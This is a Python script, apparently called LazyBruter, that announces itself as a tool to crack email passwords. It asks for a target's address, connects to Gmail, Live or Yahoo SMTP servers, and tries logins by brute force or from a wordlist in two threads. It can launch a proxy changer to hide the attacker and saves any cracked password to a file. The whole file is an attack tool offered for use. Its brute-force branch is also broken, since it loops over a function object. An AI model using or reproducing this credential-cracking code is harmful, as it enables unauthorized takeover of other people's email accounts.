import smtplib
import itertools
import os
from time import sleep
from threading import *

print("         _                           ______                                 ")
print("	| |                         (____  \             _               ")
print("	| |      ____ _____ _   _    ____)  ) ____ _   _| |_  ____  ____ ")
print("	| |     / _  (___  ) | | |  |  __  ( / ___) | | |  _)/ _  )/ ___)")
print("	| |____( ( | |/ __/| |_| |  | |__)  ) |   | |_| | |_( (/ /| |     ")  
print("	|_______)_||_(_____)\__  |  |______/|_|    \____|\___)____)_|   ")
print("	                   (____/                                      ")
																															  
print		("\nThis tool is a bruter tool that is meant to crack email password.")
print                    ("[+] Coded by The Browser Pirates [+]")

#all data input begins here	
proxyconfirm = input ("\nDo you want to enable proxy? [y/n]")
if proxyconfirm == "y":
	print ("Opening a new shell to generate proxies...")
	os.system('start cmd /D /C "py proxychanger.py"')
	
if proxyconfirm == "n":
    print("Proxies not activated.")
    pass
user = input("\nEnter Target's Email Address: ")	
if 'gmail' in user:
    server = "gmail"
    port = 587
elif 'live' in user:
    server = "live"
    port = 587
elif 'yahoo' in user:
    server = "yahoo"
    port = 587
else:
    server = input ("Enter Email Service name [ex: gmail]: ")
    port = int(input("Enter the SMTP port [default: 587]: "))

print("Connecting...")
smtpserver_server = smtplib.SMTP("smtp."+server+".com",port)
smtpserver_server.ehlo()
smtpserver_server.starttls()
smtpserver_server.ehlo() #this will avoid connection refuses
print("Connected to SMTP server. Ready to perform an attack.")

method = input("\nChoose method to attack => (a)Brute Force (b)Dictionary : ")
if method == "a":
    min_pass = int(input("Enter the minimum number of password you want to start the Brute-Force(Default:8): "))
    print ("\nYou are about to attack this email: ",user)
    verify2 = input ("Do you want to continue? [y/n]: ")
    if verify2 == "y" or verify2 == "Y":
        def print_perms(chars, minlen, maxlen): 
            for n in range(minlen, maxlen+1): 
                for perm in itertools.product(chars, repeat=n): 
                    print(''.join(perm)) 
            
    print_perms ("abcdefghijklmnopqrstuvwxyz1234567890!#$%&'*+-/=?^_`{|}~;", min_pass, 90)

    for password in print_perms:
        try:
            smtpserver_server.login(user, password)
            print ("[+] Password Cracked: ", password)
            input("Press Enter to save the result in .txt")
            file = open("password cracked.txt","w")
            file.write("Email: ")
            file.write(user)
            file.write("    Password: ")
            file.write(password)
            file.close()
            input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")
            t1.join()
            t2.join()
            break
			
        except smtplib.SMTPAuthenticationError:
            print ("[!] Password Inccorect: ", password)
			
    if verify2 == "n" or verify2 == "N":   
        quit()

#this class is in the middle of the script, so as to make sure it gets all the attributes
class Core1(Thread):
    def run(self):
        for password in passwfile:
            try:
                smtpserver_server.login(user, password)
                print ("[+] Password Found: ", password)
                input("Press Enter to save the result in .txt")
                file = open("password cracked.txt","w")
                file.write("Email: ")
                file.write(user)
                file.write("    Password: ")
                file.write(password)
                file.close()
                input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")
                break
				
            except smtplib.SMTPAuthenticationError:
                print ("[!] Trying password: ", password)

class Core2(Thread):		
    def run(self):
        for password in reversedpasswfile:
            try:
                smtpserver_server.login(user, password)
                print ("[+] Password Found: ", password)
                input("Press Enter to save the result in .txt")
                file = open("password cracked.txt","w")
                file.write("Email: ")
                file.write(user)
                file.write("    Password: ")
                file.write(password)
                file.close()
                input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")
                t1.join()
                t2.join()
                break
				
            except smtplib.SMTPAuthenticationError:
                print ("[!] Trying password: ", password)

if method == "b":
    passwfile = input("Enter the Wordlist Path: ")
    passwfile = open(passwfile, "r")
    reversedpasswfile = input("Enter the Wordlist Path one more time: ")
    with open(reversedpasswfile) as f,  open('reversed_wordlist.txt', 'w') as fout:
        fout.writelines(reversed(f.readlines()))
    reversedpasswfile = open("reversed_wordlist.txt", "r")
    t1 = Core1()
    t2 = Core2()
	
    t1.start()
    sleep(0.001)
    t2.start()
